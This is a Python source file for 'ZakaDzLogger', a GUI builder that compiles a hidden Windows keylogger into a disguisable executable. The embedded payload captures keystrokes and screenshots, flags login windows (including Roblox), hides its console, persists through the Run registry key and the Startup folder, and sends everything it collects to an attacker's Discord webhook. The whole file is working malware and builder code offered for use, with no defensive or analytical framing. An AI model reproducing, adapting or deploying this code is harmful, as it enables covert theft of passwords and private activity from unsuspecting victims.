# -*- coding: utf-8 -*-
"""
ZakaDzLogger - Generador de keylogger.
Creditos: ZakaDz
"""

import os
import sys
import random
import shutil
import subprocess
import tempfile
import threading
import queue
import tkinter as tk
from tkinter import filedialog, messagebox

# ============================================================
# PALETA
# ============================================================
BG      = "#030603"
PANEL   = "#05100a"
GREEN   = "#00ff41"
GREEN_D = "#00b32e"
DIM     = "#0d3d1f"
GREY    = "#3d7a52"
RED     = "#ff3b3b"
FONT    = "Consolas"

# ============================================================
# PLANTILLA DEL PAYLOAD
# ============================================================

PAYLOAD = r'''# -*- coding: utf-8 -*-
# Generado con ZakaDzLogger - by ZakaDz
import os, sys, time, ctypes, threading, uuid, shutil, io, winreg, urllib.request
from ctypes import wintypes

WEBHOOK = "__WEBHOOK__"
LOG_INTERVAL = __LOG_INTERVAL__
SHOT_INTERVAL = __SHOT_INTERVAL__
ENABLE_KEYS = __ENABLE_KEYS__
ENABLE_SHOTS = __ENABLE_SHOTS__
APP_NAME = "__APP_NAME__"

APPDATA = os.environ.get("APPDATA") or os.path.expanduser("~")
INSTALL_DIR = os.path.join(APPDATA, APP_NAME)
EXE_NAME = os.path.basename(sys.executable)
TARGET_EXE = os.path.join(INSTALL_DIR, EXE_NAME)
STARTUP_DIR = os.path.join(APPDATA, r"Microsoft\Windows\Start Menu\Programs\Startup")
RUN_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"

user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32
BUFFER = []
LOCK = threading.Lock()
_last_title = ""

BROWSERS = ("chrome.exe", "msedge.exe", "firefox.exe", "brave.exe", "opera.exe",
            "vivaldi.exe", "iexplore.exe", "librewolf.exe", "waterfox.exe")

LOGIN_HINTS = ("iniciar sesion", "iniciar sesión", "log in", "login", "sign in",
               "signin", "acceder", "entrar", "cuenta", "account", "password",
               "contraseña", "roblex", "roblox")

SPECIAL = {
    8: "[BACKSPACE]", 9: "[TAB]", 13: "[ENTER]", 16: "[SHIFT]", 17: "[CTRL]",
    18: "[ALT]", 19: "[PAUSE]", 20: "[CAPS]", 27: "[ESC]", 32: " ",
    33: "[PGUP]", 34: "[PGDN]", 35: "[END]", 36: "[HOME]", 37: "[LEFT]",
    38: "[UP]", 39: "[RIGHT]", 40: "[DOWN]", 45: "[INS]", 46: "[DEL]",
    91: "[WIN]", 92: "[WIN]", 93: "[MENU]", 144: "[NUMLOCK]",
    186: ";", 187: "=", 188: ",", 189: "-", 190: ".", 191: "/",
    192: "`", 219: "[", 220: "\\", 221: "]", 222: "'",
}
SHIFT_MAP = {
    "1": "!", "2": "@", "3": "#", "4": "$", "5": "%", "6": "^", "7": "&",
    "8": "*", "9": "(", "0": ")", "-": "_", "=": "+", "[": "{", "]": "}",
    "\\": "|", ";": ":", "'": "\"", ",": "<", ".": ">", "/": "?", "`": "~",
}


def now():
    return time.strftime("%Y-%m-%d %H:%M:%S")


def chunks(s, n):
    for i in range(0, len(s), n):
        yield s[i:i + n]


def send_discord(text=None, file_bytes=None, filename=None):
    if not WEBHOOK:
        return
    boundary = "----VeniceBoundary" + uuid.uuid4().hex
    body = b""
    if text:
        body += ("--%s\r\nContent-Disposition: form-data; name=\"content\"\r\n\r\n%s\r\n"
                 % (boundary, text)).encode("utf-8", "replace")
    if file_bytes:
        body += ("--%s\r\nContent-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\n"
                 "Content-Type: application/octet-stream\r\n\r\n"
                 % (boundary, filename)).encode("utf-8", "replace")
        body += file_bytes + b"\r\n"
    body += ("--%s--\r\n" % boundary).encode()
    req = urllib.request.Request(
        WEBHOOK, data=body,
        headers={
            "Content-Type": "multipart/form-data; boundary=%s" % boundary,
            "User-Agent": "Mozilla/5.0",
        })
    urllib.request.urlopen(req, timeout=30)


def hide_console():
    try:
        hwnd = kernel32.GetConsoleWindow()
        if hwnd:
            user32.ShowWindow(hwnd, 0)
    except Exception:
        pass


def foreground_info():
    try:
        hwnd = user32.GetForegroundWindow()
        if not hwnd:
            return "", ""
        n = user32.GetWindowTextLengthW(hwnd)
        title = ""
        if n > 0:
            buf = ctypes.create_unicode_buffer(n + 1)
            user32.GetWindowTextW(hwnd, buf, n + 1)
            title = buf.value.strip()
        pid = wintypes.DWORD()
        user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
        exe = ""
        h = kernel32.OpenProcess(0x1000, False, pid.value)
        if h:
            b = ctypes.create_unicode_buffer(512)
            size = wintypes.DWORD(512)
            if kernel32.QueryFullProcessImageNameW(h, 0, b, ctypes.byref(size)):
                exe = os.path.basename(b.value)
            kernel32.CloseHandle(h)
        return exe, title
    except Exception:
        return "", ""


def build_context():
    exe, title = foreground_info()
    if not title:
        return ""
    tag = "[WEB]" if exe.lower() in BROWSERS else "[APP]"
    extra = ""
    low = title.lower()
    for h in LOGIN_HINTS:
        if h in low:
            extra = "  << posible LOGIN"
            break
    return "\n=== [%s] %s %s | %s%s ===\n" % (now(), tag, exe or "?", title, extra)


def vk_to_char(vk):
    shift = bool(user32.GetAsyncKeyState(16) & 0x8000)
    if vk in SPECIAL:
        c = SPECIAL[vk]
        if shift and c in SHIFT_MAP:
            return SHIFT_MAP[c]
        return c
    if 65 <= vk <= 90:
        return chr(vk).upper() if shift else chr(vk).lower()
    if 48 <= vk <= 57:
        d = chr(vk)
        return SHIFT_MAP.get(d, d) if shift else d
    if 96 <= vk <= 105:
        return str(vk - 96)
    return None


def already_running():
    kernel32.CreateMutexW(None, False, "klog_" + APP_NAME)
    return kernel32.GetLastError() == 183


def install_persistence():
    try:
        if not os.path.isdir(INSTALL_DIR):
            os.makedirs(INSTALL_DIR)
    except Exception:
        pass
    try:
        if os.path.abspath(sys.executable) != os.path.abspath(TARGET_EXE):
            shutil.copy2(sys.executable, TARGET_EXE)
    except Exception:
        pass
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_KEY, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, '"' + TARGET_EXE + '"')
        winreg.CloseKey(key)
    except Exception:
        pass
    try:
        dst = os.path.join(STARTUP_DIR, EXE_NAME)
        if os.path.abspath(sys.executable) != os.path.abspath(dst):
            shutil.copy2(sys.executable, dst)
    except Exception:
        pass


def context_loop():
    global _last_title
    while True:
        try:
            exe, title = foreground_info()
            key = exe + "|" + title
            if title and key != _last_title:
                _last_title = key
                ctx = build_context()
                if ctx:
                    with LOCK:
                        BUFFER.append(ctx)
        except Exception:
            pass
        time.sleep(2)


def key_loop():
    prev = {}
    held = {}
    last_rep = {}
    while True:
        try:
            for vk in range(8, 256):
                down = bool(user32.GetAsyncKeyState(vk) & 0x8000)
                emit = False
                if down and not prev.get(vk, False):
                    emit = True
                    held[vk] = time.time()
                elif down and vk in held:
                    if time.time() - held[vk] > 0.55 and time.time() - last_rep.get(vk, 0) > 0.045:
                        emit = True
                        last_rep[vk] = time.time()
                if emit:
                    ch = vk_to_char(vk)
                    if ch is not None:
                        with LOCK:
                            BUFFER.append(ch)
                            if len(BUFFER) > 40000:
                                del BUFFER[:8000]
                if not down:
                    held.pop(vk, None)
                    last_rep.pop(vk, None)
                prev[vk] = down
        except Exception:
            pass
        time.sleep(0.012)


def flush_loop():
    while True:
        time.sleep(max(1, LOG_INTERVAL))
        with LOCK:
            if not BUFFER:
                continue
            data = "".join(BUFFER)
            del BUFFER[:]
        if not data.strip():
            continue
        for part in chunks(data, 1650):
            try:
                send_discord(text="```\n" + part + "\n```")
            except Exception:
                pass
            time.sleep(1)


def shot_loop():
    try:
        from PIL import ImageGrab
    except Exception:
        return
    while True:
        time.sleep(max(1, SHOT_INTERVAL))
        try:
            img = ImageGrab.grab(all_screens=True)
            w, h = img.size
            if w > 1920:
                r = 1920.0 / w
                img = img.resize((1920, int(h * r)))
            bio = io.BytesIO()
            img.save(bio, "JPEG", quality=65)
            exe, title = foreground_info()
            send_discord(
                text="Captura - `%s` - %s\n> %s" % (os.environ.get("USERNAME", "?"), now(), title),
                file_bytes=bio.getvalue(),
                filename="shot_%s.jpg" % time.strftime("%Y%m%d_%H%M%S"))
        except Exception:
            pass


def main():
    if already_running():
        return
    hide_console()
    install_persistence()
    try:
        exe, title = foreground_info()
        send_discord(text="**ZakaDzLogger activo**\nEquipo: `%s`\nUsuario: `%s`\nLogs cada %ss | Capturas cada %ss\nActivo ahora: %s\n_by ZakaDz_"
                     % (os.environ.get("COMPUTERNAME", "?"),
                        os.environ.get("USERNAME", "?"),
                        LOG_INTERVAL, SHOT_INTERVAL, title or exe or "?"))
    except Exception:
        pass
    threading.Thread(target=context_loop, daemon=True).start()
    if ENABLE_KEYS:
        threading.Thread(target=key_loop, daemon=True).start()
        threading.Thread(target=flush_loop, daemon=True).start()
    if ENABLE_SHOTS:
        threading.Thread(target=shot_loop, daemon=True).start()
    while True:
        time.sleep(3600)


if __name__ == "__main__":
    main()
'''

BANNER = r"""
  ____       _         ____       _
 |__  / __ _| | ____ _|  _ \ ____| |    ___   __ _  __ _  ___ _ __
   / / / _` | |/ / _` | | | |_  / |   / _ \ / _` |/ _` |/ _ \ '__|
  / /_| (_| |   < (_| | |_| / /| |__| (_) | (_| | (_| |  __/ |
 /____|\__,_|_|\_\__,_|____/___|_____\___/ \__, |\__, |\___|_|
                                           |___/ |___/
"""

GLYPHS = "01ABCDEF#$%&*+/\\<>[]{}=-_ZAKADZ"


class App(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("ZakaDzLogger :: by ZakaDz")
        self.geometry("700x810")
        self.resizable(False, False)
        self.configure(bg=DIM)

        self.queue = queue.Queue()
        self.building = False
        self.blink_on = True

        outer = tk.Frame(self, bg=BG)
        outer.pack(fill="both", expand=True, padx=1, pady=1)
        self.body = outer

        self.build_header(outer)
        self.build_form(outer)
        self.build_buttons(outer)
        self.build_console(outer)
        self.build_statusbar(outer)

        self.dist_dir = os.path.join(os.path.dirname(os.path.abspath(sys.argv[0])), "salida")
        self.after(120, self.pump)
        self.after(80, self.rain)
        self.after(500, self.blink)
        self.after(300, self.boot_sequence)

    def build_header(self, parent):
        self.canvas = tk.Canvas(parent, height=118, bg="#010401",
                                highlightthickness=0, bd=0)
        self.canvas.pack(fill="x")

        self.canvas.create_text(350, 42, text="ZakaDzLogger",
                                font=(FONT, 30, "bold"), fill=GREEN, tags="title")
        self.canvas.create_text(350, 74, text="[ KEYLOGGER BUILDER :: by ZakaDz ]",
                                font=(FONT, 9), fill=GREEN_D, tags="sub")
        self.canvas.create_text(350, 94, text="_" * 62, font=(FONT, 7), fill=DIM, tags="rule")

        self.rain_cols = []
        for x in range(8, 700, 16):
            self.rain_cols.append({
                "x": x,
                "y": random.randint(-120, 118),
                "speed": random.randint(3, 9),
                "trail": [],
            })

        tk.Frame(parent, bg=DIM, height=1).pack(fill="x", pady=(0, 10))

    def label(self, parent, text):
        l = tk.Label(parent, text="> " + text, bg=BG, fg=GREEN,
                     font=(FONT, 9), anchor="w")
        l.pack(fill="x", padx=16, pady=(8, 3))
        return l

    def entry(self, parent, default="", width=66):
        e = tk.Entry(parent, bg=PANEL, fg=GREEN, insertbackground=GREEN,
                     relief="flat", font=(FONT, 10), width=width,
                     highlightthickness=1, highlightbackground=DIM,
                     highlightcolor=GREEN)
        if default:
            e.insert(0, default)
        e.pack(fill="x", padx=16)
        return e

    def button(self, parent, text, cmd, accent=False):
        b = tk.Button(parent, text=text, command=cmd, font=(FONT, 10, "bold"),
                      bg=GREEN if accent else PANEL,
                      fg=BG if accent else GREEN,
                      activebackground=GREEN_D if accent else GREEN,
                      activeforeground=BG,
                      relief="flat", bd=0, padx=14, pady=7, cursor="hand2")
        b.pack(side="left", padx=5)
        return b

    def build_form(self, parent):
        self.label(parent, "webhook de discord")
        self.e_webhook = self.entry(parent, width=66)

        self.label(parent, "nombre del ejecutable")
        self.e_name = self.entry(parent, "ZakaDzLogger", width=66)

        self.label(parent, "ruta del icono (.ico)")
        f_icon = tk.Frame(parent, bg=BG)
        f_icon.pack(fill="x", padx=16)
        self.e_icon = tk.Entry(f_icon, bg=PANEL, fg=GREEN, insertbackground=GREEN,
                               relief="flat", font=(FONT, 10), width=54,
                               highlightthickness=1, highlightbackground=DIM,
                               highlightcolor=GREEN)
        self.e_icon.pack(side="left", fill="x", expand=True)
        tk.Button(f_icon, text="[ buscar ]", command=self.pick_icon, font=(FONT, 9),
                  bg=PANEL, fg=GREEN, activebackground=GREEN, activeforeground=BG,
                  relief="flat", bd=0, padx=8, cursor="hand2").pack(side="left", padx=(8, 0))

        self.label(parent, "intervalos de envio en segundos (minimo 1)")
        f_int = tk.Frame(parent, bg=BG)
        f_int.pack(fill="x", padx=16)
        tk.Label(f_int, text="logs:", bg=BG, fg=GREY, font=(FONT, 9)).pack(side="left")
        self.e_log = tk.Entry(f_int, bg=PANEL, fg=GREEN, insertbackground=GREEN,
                              relief="flat", font=(FONT, 10), width=8,
                              highlightthickness=1, highlightbackground=DIM,
                              highlightcolor=GREEN)
        self.e_log.insert(0, "30")
        self.e_log.pack(side="left", padx=(6, 26))
        tk.Label(f_int, text="capturas:", bg=BG, fg=GREY, font=(FONT, 9)).pack(side="left")
        self.e_shot = tk.Entry(f_int, bg=PANEL, fg=GREEN, insertbackground=GREEN,
                               relief="flat", font=(FONT, 10), width=8,
                               highlightthickness=1, highlightbackground=DIM,
                               highlightcolor=GREEN)
        self.e_shot.insert(0, "300")
        self.e_shot.pack(side="left", padx=6)

        self.label(parent, "modulos")
        f_opt = tk.Frame(parent, bg=BG)
        f_opt.pack(fill="x", padx=16)
        self.v_keys = tk.BooleanVar(value=True)
        self.v_shots = tk.BooleanVar(value=True)
        self.v_console = tk.BooleanVar(value=False)
        for txt, var in (("teclado", self.v_keys), ("pantalla", self.v_shots),
                         ("dejar consola visible (debug)", self.v_console)):
            tk.Checkbutton(f_opt, text=txt, variable=var, bg=BG, fg=GREEN,
                           selectcolor=PANEL, activebackground=BG, activeforeground=GREEN_D,
                           font=(FONT, 9), bd=0, highlightthickness=0).pack(side="left", padx=(0, 20))

        tk.Label(parent, text="// el binario se autoinstala en %APPDATA%, se registra en el arranque y corre invisible",
                 bg=BG, fg=GREY, font=(FONT, 8), anchor="w").pack(fill="x", padx=16, pady=(10, 0))

    def build_buttons(self, parent):
        f = tk.Frame(parent, bg=BG)
        f.pack(fill="x", padx=11, pady=14)
        self.b_build = self.button(f, "COMPILAR .EXE", self.build, accent=True)
        self.button(f, "PROBAR", self.test_run)
        self.button(f, "SALIDA", self.open_dist)
        self.button(f, "SALIR", self.destroy)

    def build_console(self, parent):
        tk.Label(parent, text="> consola", bg=BG, fg=GREEN, font=(FONT, 9),
                 anchor="w").pack(fill="x", padx=16, pady=(0, 3))
        frame = tk.Frame(parent, bg=DIM)
        frame.pack(fill="both", expand=True, padx=16)
        self.txt = tk.Text(frame, height=12, bg="#010401", fg=GREEN, font=(FONT, 9),
                           insertbackground=GREEN, relief="flat", bd=0,
                           padx=8, pady=6, wrap="word")
        self.txt.pack(fill="both", expand=True, padx=1, pady=1)
        self.txt.tag_config("ok", foreground=GREEN)
        self.txt.tag_config("err", foreground=RED)
        self.txt.tag_config("dim", foreground=GREY)
        self.txt.tag_config("prompt", foreground=GREEN_D)
        self.txt.configure(state="disabled")

    def build_statusbar(self, parent):
        bar = tk.Frame(parent, bg=PANEL)
        bar.pack(fill="x", pady=(10, 0))
        self.lbl_status = tk.Label(bar, text="  * LISTO", bg=PANEL, fg=GREEN,
                                   font=(FONT, 8), anchor="w")
        self.lbl_status.pack(side="left", pady=3)
        tk.Label(bar, text="ZakaDzLogger v1.1 // by ZakaDz  ", bg=PANEL, fg=GREY,
                 font=(FONT, 8)).pack(side="right", pady=3)

    def rain(self):
        try:
            self.canvas.delete("rain")
            for col in self.rain_cols:
                col["y"] += col["speed"]
                if col["y"] > 148:
                    col["y"] = random.randint(-140, -20)
                    col["speed"] = random.randint(3, 9)
                    col["trail"] = []
                col["trail"].insert(0, col["y"])
                del col["trail"][9:]
                for i, ty in enumerate(col["trail"]):
                    ch = random.choice(GLYPHS)
                    shade = GREEN if i == 0 else (GREEN_D if i < 3 else "#0a5c1e" if i < 6 else DIM)
                    self.canvas.create_text(col["x"], ty, text=ch, fill=shade,
                                            font=(FONT, 8), tags="rain")
            self.canvas.tag_raise("title")
            self.canvas.tag_raise("sub")
            self.canvas.tag_raise("rule")
            self.after(80, self.rain)
        except tk.TclError:
            pass

    def blink(self):
        try:
            self.blink_on = not self.blink_on
            self.canvas.itemconfig("sub", fill=GREEN_D if self.blink_on else DIM)
            self.after(500, self.blink)
        except tk.TclError:
            pass

    def boot_sequence(self):
        self.log("root@zakadz:~# ./zakadzlogger --init", "prompt")
        self.log("[+] cargando modulo de contexto (app/ventana/url)", "ok")
        self.log("[+] enlazando consola de salida", "ok")
        self.log("[*] esperando configuracion...", "dim")

    def log(self, msg, tag="ok"):
        self.queue.put((msg, tag))

    def pump(self):
        while not self.queue.empty():
            msg, tag = self.queue.get()
            self.txt.configure(state="normal")
            self.txt.insert("end", msg + "\n", tag)
            self.txt.see("end")
            self.txt.configure(state="disabled")
        self.after(120, self.pump)

    def status(self, txt, color=GREEN):
        self.lbl_status.configure(text="  * " + txt, fg=color)

    def pick_icon(self):
        p = filedialog.askopenfilename(filetypes=[("Iconos", "*.ico"), ("Todos", "*.*")])
        if p:
            self.e_icon.delete(0, "end")
            self.e_icon.insert(0, p)
            self.log("[+] icono: " + os.path.basename(p), "dim")

    def open_dist(self):
        if os.path.isdir(self.dist_dir):
            os.startfile(self.dist_dir)
        else:
            messagebox.showinfo("Aviso", "Todavia no hay ninguna compilacion.")

    def collect(self):
        hook = self.e_webhook.get().strip()
        name = self.e_name.get().strip()
        if not hook.startswith("https://discord.com/api/webhooks/") and \
           not hook.startswith("https://discordapp.com/api/webhooks/"):
            raise ValueError("La URL del webhook no parece valida.")
        if not name:
            raise ValueError("Escribe un nombre para el ejecutable.")
        name = "".join(c for c in name if c not in '\\/:*?"<>|').strip()
        if not name:
            raise ValueError("Nombre de ejecutable no valido.")
        try:
            log_i = int(self.e_log.get())
            shot_i = int(self.e_shot.get())
        except ValueError:
            raise ValueError("Los intervalos deben ser numeros enteros.")
        if log_i < 1:
            raise ValueError("El intervalo de logs debe ser 1 segundo o mas.")
        if shot_i < 1:
            raise ValueError("El intervalo de capturas debe ser 1 segundo o mas.")
        icon = self.e_icon.get().strip()
        if icon and not os.path.isfile(icon):
            raise ValueError("El icono indicado no existe.")
        return hook, name, log_i, shot_i, icon

    def render_payload(self, hook, name, log_i, shot_i):
        code = PAYLOAD
        code = code.replace("__WEBHOOK__", hook)
        code = code.replace("__LOG_INTERVAL__", str(log_i))
        code = code.replace("__SHOT_INTERVAL__", str(shot_i))
        code = code.replace("__ENABLE_KEYS__", "True" if self.v_keys.get() else "False")
        code = code.replace("__ENABLE_SHOTS__", "True" if self.v_shots.get() else "False")
        code = code.replace("__APP_NAME__", name)
        return code

    def test_run(self):
        try:
            hook, name, log_i, shot_i, icon = self.collect()
        except ValueError as e:
            self.log("[!] " + str(e), "err")
            self.status("ERROR", RED)
            return
        tmp = os.path.join(tempfile.gettempdir(), "klog_test.py")
        with open(tmp, "w", encoding="utf-8") as f:
            f.write(self.render_payload(hook, name, log_i, shot_i))
        subprocess.Popen([sys.executable, tmp], creationflags=subprocess.CREATE_NEW_CONSOLE)
        self.log("[+] ejecutando en modo prueba (la consola se oculta sola)", "ok")
        self.status("PRUEBA ACTIVA")

    def build(self):
        if self.building:
            return
        try:
            hook, name, log_i, shot_i, icon = self.collect()
        except ValueError as e:
            self.log("[!] " + str(e), "err")
            self.status("ERROR", RED)
            return
        if subprocess.run([sys.executable, "-m", "PyInstaller", "--version"],
                          capture_output=True).returncode != 0:
            self.log("[!] PyInstaller no instalado: pip install pyinstaller pillow", "err")
            self.status("ERROR", RED)
            return
        if self.v_shots.get():
            if subprocess.run([sys.executable, "-c", "import PIL"], capture_output=True).returncode != 0:
                self.log("[!] Pillow no instalado: pip install pillow", "err")
                self.status("ERROR", RED)
                return

        self.building = True
        self.b_build.configure(state="disabled")
        self.status("COMPILANDO...")
        threading.Thread(target=self._build_worker,
                         args=(hook, name, log_i, shot_i, icon), daemon=True).start()

    def _build_worker(self, hook, name, log_i, shot_i, icon):
        work = tempfile.mkdtemp(prefix="klogbuild_")
        try:
            src = os.path.join(work, "payload.py")
            with open(src, "w", encoding="utf-8") as f:
                f.write(self.render_payload(hook, name, log_i, shot_i))

            os.makedirs(self.dist_dir, exist_ok=True)
            cmd = [sys.executable, "-m", "PyInstaller", "--onefile", "--clean",
                   "--name", name, "--distpath", self.dist_dir,
                   "--workpath", work, "--specpath", work, src]
            cmd.append("--console" if self.v_console.get() else "--noconsole")
            if icon:
                cmd += ["--icon", icon]

            self.log("[*] invocando pyinstaller...", "ok")
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                    text=True, encoding="utf-8", errors="replace")
            for line in proc.stdout:
                line = line.rstrip()
                if line:
                    self.log(line, "dim")
            proc.wait()

            exe = os.path.join(self.dist_dir, name + ".exe")
            if proc.returncode == 0 and os.path.isfile(exe):
                self.log("[+] BUILD OK -> " + exe, "ok")
                self.log("[+] se ejecuta invisible y se instala solo", "ok")
                self.status("COMPLETADO")
            else:
                self.log("[!] la compilacion ha fallado", "err")
                self.status("FALLIDO", RED)
        except Exception as e:
            self.log("[!] " + str(e), "err")
            self.status("FALLIDO", RED)
        finally:
            shutil.rmtree(work, ignore_errors=True)
            self.building = False
            self.b_build.configure(state="normal")


if __name__ == "__main__":
    App().mainloop()